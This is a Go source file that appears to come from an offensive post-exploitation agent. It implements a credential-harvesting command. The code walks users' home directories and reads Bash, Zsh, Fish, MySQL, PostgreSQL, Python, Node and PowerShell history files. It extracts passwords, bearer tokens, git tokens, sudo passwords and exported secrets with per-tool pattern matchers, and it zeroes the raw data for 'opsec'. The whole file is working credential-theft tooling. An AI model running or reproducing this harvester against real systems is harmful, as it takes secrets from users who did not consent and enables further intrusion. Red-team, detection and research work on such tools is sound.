package commands

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// --- Shell History credential extraction ---

// historyCredPattern defines a regex-free pattern for matching credentials in shell history lines.
type historyCredPattern struct {
	// contains is a substring that must be present (case-insensitive) for a fast pre-filter
	contains string
	// category labels the finding type
	category string
	// matchFunc determines if a line matches and extracts the sensitive portion
	matchFunc func(line string) string
}

// historyCredPatterns defines patterns for credential extraction from shell history.
// Order doesn't matter — all matching patterns are reported.
var historyCredPatterns = []historyCredPattern{
	{
		contains: "sshpass",
		category: "SSH Password (sshpass)",
		matchFunc: func(line string) string {
			// sshpass -p 'password' or sshpass -p password
			idx := strings.Index(line, "-p")
			if idx == -1 {
				return ""
			}
			rest := strings.TrimSpace(line[idx+2:])
			if rest == "" {
				return ""
			}
			return extractQuotedOrWord(rest)
		},
	},
	{
		contains: "mysql",
		category: "MySQL Password",
		matchFunc: func(line string) string {
			// mysql -p<password> (no space) or --password=<password>
			if idx := strings.Index(line, "--password="); idx != -1 {
				return extractQuotedOrWord(line[idx+11:])
			}
			// mysql -u user -pPASSWORD (no space after -p, and next char is not a flag)
			idx := strings.Index(line, " -p")
			if idx == -1 {
				return ""
			}
			rest := line[idx+3:]
			if rest == "" || rest[0] == ' ' || rest[0] == '-' {
				return "" // -p with space is interactive prompt, not inline password
			}
			return extractQuotedOrWord(rest)
		},
	},
	{
		contains: "curl",
		category: "HTTP Credential (curl)",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			// curl -u user:pass or --user user:pass
			for _, flag := range []string{" -u ", " --user "} {
				if idx := strings.Index(lower, flag); idx != -1 {
					rest := strings.TrimSpace(line[idx+len(flag):])
					val := extractQuotedOrWord(rest)
					if strings.Contains(val, ":") {
						return val
					}
				}
			}
			// curl -H "Authorization: Bearer <token>"
			if idx := strings.Index(lower, "authorization:"); idx != -1 {
				rest := strings.TrimSpace(line[idx+14:])
				// Take the rest up to the closing quote or EOL
				if end := strings.IndexAny(rest, "\"'"); end != -1 {
					return strings.TrimSpace(rest[:end])
				}
				return extractQuotedOrWord(rest)
			}
			return ""
		},
	},
	{
		contains: "wget",
		category: "HTTP Credential (wget)",
		matchFunc: func(line string) string {
			for _, flag := range []string{"--password=", "--http-password=", "--ftp-password="} {
				if idx := strings.Index(line, flag); idx != -1 {
					return extractQuotedOrWord(line[idx+len(flag):])
				}
			}
			return ""
		},
	},
	{
		contains: "docker login",
		category: "Docker Registry Password",
		matchFunc: func(line string) string {
			for _, flag := range []string{"--password=", "--password ", " -p "} {
				if idx := strings.Index(line, flag); idx != -1 {
					rest := strings.TrimSpace(line[idx+len(flag):])
					return extractQuotedOrWord(rest)
				}
			}
			return ""
		},
	},
	{
		contains: "htpasswd",
		category: "htpasswd Password",
		matchFunc: func(line string) string {
			// htpasswd -b <file> <user> <password>
			if !strings.Contains(line, " -b") && !strings.Contains(line, " -B") {
				return ""
			}
			parts := strings.Fields(line)
			if len(parts) >= 5 {
				return parts[len(parts)-1] // last arg is the password
			}
			return ""
		},
	},
	{
		contains: "psql",
		category: "PostgreSQL Credential",
		matchFunc: func(line string) string {
			// psql postgres://user:pass@host/db
			if idx := strings.Index(line, "://"); idx != -1 {
				rest := line[idx+3:]
				if at := strings.Index(rest, "@"); at != -1 {
					userPass := rest[:at]
					if strings.Contains(userPass, ":") {
						return userPass
					}
				}
			}
			return ""
		},
	},
	{
		contains: "export",
		category: "Exported Secret",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			if !strings.HasPrefix(strings.TrimSpace(lower), "export ") {
				return ""
			}
			// Check if the exported variable name contains sensitive keywords
			sensitiveKeys := []string{"password", "secret", "token", "key", "credential", "passwd", "api_key", "apikey"}
			for _, k := range sensitiveKeys {
				if strings.Contains(lower, k) && strings.Contains(line, "=") {
					// Return the full assignment
					trimmed := strings.TrimSpace(line)
					if idx := strings.Index(trimmed, " "); idx != -1 {
						return strings.TrimSpace(trimmed[idx+1:])
					}
				}
			}
			return ""
		},
	},
	{
		contains: "git clone",
		category: "Git Token",
		matchFunc: func(line string) string {
			// git clone https://<token>@github.com/... or https://user:token@
			if idx := strings.Index(line, "://"); idx != -1 {
				rest := line[idx+3:]
				if at := strings.Index(rest, "@"); at != -1 {
					userToken := rest[:at]
					// Avoid matching just "git" (git@github.com is SSH, not a token)
					if userToken != "git" && len(userToken) > 4 {
						return userToken
					}
				}
			}
			return ""
		},
	},
	{
		contains: "sudo",
		category: "Sudo Password (echo pipe)",
		matchFunc: func(line string) string {
			lower := strings.ToLower(line)
			// echo 'password' | sudo -S ...
			if strings.Contains(lower, "sudo") && strings.Contains(lower, "-s") && strings.Contains(lower, "echo") {
				// Extract the echo argument
				echoIdx := strings.Index(lower, "echo")
				pipeIdx := strings.Index(line[echoIdx:], "|")
				if pipeIdx != -1 {
					echoPart := strings.TrimSpace(line[echoIdx+4 : echoIdx+pipeIdx])
					return extractQuotedOrWord(echoPart)
				}
			}
			return ""
		},
	},
}

// historyFiles defines shell history file paths relative to home directory.
var historyFiles = []struct {
	name     string
	relPaths []string
	parser   func(data []byte) []string // optional custom parser for non-standard formats
}{
	{"Bash", []string{".bash_history"}, nil},
	{"Zsh", []string{".zsh_history", ".zhistory"}, parseZshHistory},
	{"Fish", []string{".local/share/fish/fish_history"}, parseFishHistory},
	{"MySQL", []string{".mysql_history"}, nil},
	{"PostgreSQL", []string{".psql_history"}, nil},
	{"Redis CLI", []string{".rediscli_history"}, nil},
	{"Python", []string{".python_history"}, nil},
	{"Node REPL", []string{".node_repl_history"}, nil},
}

// windowsHistoryFiles defines Windows-specific history file paths (absolute or env-relative).
var windowsHistoryFiles = []struct {
	name    string
	envBase string
	relPath string
}{
	{"PowerShell", "APPDATA", "Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"},
}

// parseZshHistory handles zsh extended history format where lines may start with ": timestamp:0;"
func parseZshHistory(data []byte) []string {
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Strip zsh extended history prefix: ": 1234567890:0;actual command"
		if strings.HasPrefix(line, ": ") {
			if semi := strings.Index(line, ";"); semi != -1 {
				line = line[semi+1:]
			}
		}
		lines = append(lines, line)
	}
	return lines
}

// parseFishHistory handles fish shell history format: "- cmd: <command>"
func parseFishHistory(data []byte) []string {
	var lines []string
	for _, line := range strings.Split(string(data), "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "- cmd: ") {
			lines = append(lines, line[7:])
		}
	}
	return lines
}

// historyFinding represents a credential found in a history file.
type historyFinding struct {
	Shell    string
	File     string
	Line     string
	Category string
	Value    string
}

// scanHistoryLines applies credential patterns to history lines and returns findings.
func scanHistoryLines(lines []string, shell, file string) []historyFinding {
	var findings []historyFinding
	seen := make(map[string]bool) // deduplicate identical findings

	for _, line := range lines {
		lower := strings.ToLower(line)
		for _, p := range historyCredPatterns {
			if !strings.Contains(lower, p.contains) {
				continue
			}
			val := p.matchFunc(line)
			if val == "" {
				continue
			}
			key := p.category + "|" + val
			if seen[key] {
				continue
			}
			seen[key] = true
			findings = append(findings, historyFinding{
				Shell:    shell,
				File:     file,
				Line:     line,
				Category: p.category,
				Value:    val,
			})
		}
	}
	return findings
}

// credHistory scans shell history files for leaked credentials.
func credHistory(args credHarvestArgs) structs.CommandResult {
	var sb strings.Builder
	var allFindings []historyFinding
	filesScanned := 0

	sb.WriteString("Shell History Credential Scan\n")
	sb.WriteString(strings.Repeat("=", 60) + "\n\n")

	homes := getUserHomes(args.User)

	// Scan Unix-style history files
	for _, hf := range historyFiles {
		for _, home := range homes {
			for _, relPath := range hf.relPaths {
				path := filepath.Join(home, relPath)
				data, err := os.ReadFile(path)
				if err != nil {
					continue
				}
				filesScanned++

				var lines []string
				if hf.parser != nil {
					lines = hf.parser(data)
				} else {
					for _, line := range strings.Split(string(data), "\n") {
						line = strings.TrimSpace(line)
						if line != "" {
							lines = append(lines, line)
						}
					}
				}
				structs.ZeroBytes(data) // opsec: clear raw history data

				findings := scanHistoryLines(lines, hf.name, path)
				allFindings = append(allFindings, findings...)
			}
		}
	}

	// Windows PowerShell history
	if runtime.GOOS == "windows" {
		for _, wf := range windowsHistoryFiles {
			base := os.Getenv(wf.envBase)
			if base == "" {
				continue
			}
			path := filepath.Join(base, wf.relPath)
			data, err := os.ReadFile(path)
			if err != nil {
				continue
			}
			filesScanned++

			var lines []string
			for _, line := range strings.Split(string(data), "\n") {
				line = strings.TrimSpace(line)
				if line != "" {
					lines = append(lines, line)
				}
			}
			structs.ZeroBytes(data) // opsec: clear raw PowerShell history

			findings := scanHistoryLines(lines, wf.name, path)
			allFindings = append(allFindings, findings...)
		}
	}

	sb.WriteString(fmt.Sprintf("History files scanned: %d\n", filesScanned))
	sb.WriteString(fmt.Sprintf("Credentials found: %d\n\n", len(allFindings)))

	if len(allFindings) == 0 {
		sb.WriteString("No credentials detected in shell history.\n")
		return successResult(sb.String())
	}

	// Group by category
	grouped := make(map[string][]historyFinding)
	var categories []string
	for _, f := range allFindings {
		if _, exists := grouped[f.Category]; !exists {
			categories = append(categories, f.Category)
		}
		grouped[f.Category] = append(grouped[f.Category], f)
	}

	for _, cat := range categories {
		catFindings := grouped[cat]
		sb.WriteString(fmt.Sprintf("--- %s (%d) ---\n", cat, len(catFindings)))
		for _, f := range catFindings {
			redacted := redactValue(f.Value)
			sb.WriteString(fmt.Sprintf("  [%s] %s\n", f.Shell, f.File))
			sb.WriteString(fmt.Sprintf("    Value: %s\n", redacted))
			// Show truncated command for context
			cmd := f.Line
			if len(cmd) > 120 {
				cmd = cmd[:120] + "..."
			}
			sb.WriteString(fmt.Sprintf("    Command: %s\n", cmd))
		}
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}
